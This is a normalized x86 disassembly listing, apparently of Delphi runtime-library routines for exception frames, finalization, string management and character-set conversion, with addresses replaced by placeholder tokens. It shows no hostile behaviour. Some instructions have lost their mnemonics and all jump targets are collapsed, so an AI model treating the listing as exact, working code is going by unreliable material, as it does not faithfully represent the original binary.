mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403ad8
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b46
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403b60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c00
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405978
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c24
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405978
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c4c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c70
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403ccc
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403cfc
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403d88
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403c70
call sub_403cfc
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b00
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403ad8
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405444
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403ccc
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403e78
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403e9c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403ecc
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403f3c
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403f10
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403f3c
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403f68
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403f3c
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403e78
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_403f98
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_403fb8
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_403fd4
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403e78
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4044c4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403f98
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_403f98
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4044c4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403f68
jmp r-xdata
sub_404070
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403f68
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4040a0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fd4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4040e8
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403f68
not ecx
sub_404114
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_404140
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403ecc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4044c4
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4044c4
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_404184
test edx edx
je r-xdata
mov edx ecx
jmp sub_403ecc
test ecx ecx
je sub_403ecc
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404140
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403f3c
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403ecc
pop edx
pop eax
jmp sub_404140
call sub_403ecc
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4041f8
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403f3c
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4044c4
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403ecc
dec [ edx - 0x8 ]
sub_404284
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404344
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403f3c
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_404398
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403e78
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403f68
jmp r-xdata
pop ebx
retn 0x4
sub_4043d8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404344#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4044c4
mov edi ecx
sub_404420
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4044c4
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_40447c
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4044c4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403e78
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403f3c
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404570
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404594
test edx edx
je sub_404558
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404558
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_4045b8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404558
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4047a0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fb8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_403fb8
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4047a0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404644
jmp r-xdata
sub_404644
test ecx ecx
je sub_404558
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404668
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404644
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4046d0
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404754
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4046c4
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404644
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4047a0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404548
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404530
mov ebx eax
mov eax [ edi ]
call sub_4046c4
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_4047e4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404814
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404814
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404814
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4047e4
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_4048a8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4048f4
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4048f4
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403e9c
jmp r-xdata
call sub_403e78
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404570
jmp r-xdata
call sub_404558
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4048dc
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4048f4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048a8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4054b4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404e08
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404a04
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_403ecc
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404594
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_4049ec
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b20
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a04
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4054cc
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404e44
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404b20
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403ecc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404594
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4049ec
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b20
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a04
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4054cc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404e44
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c1c
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404c70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
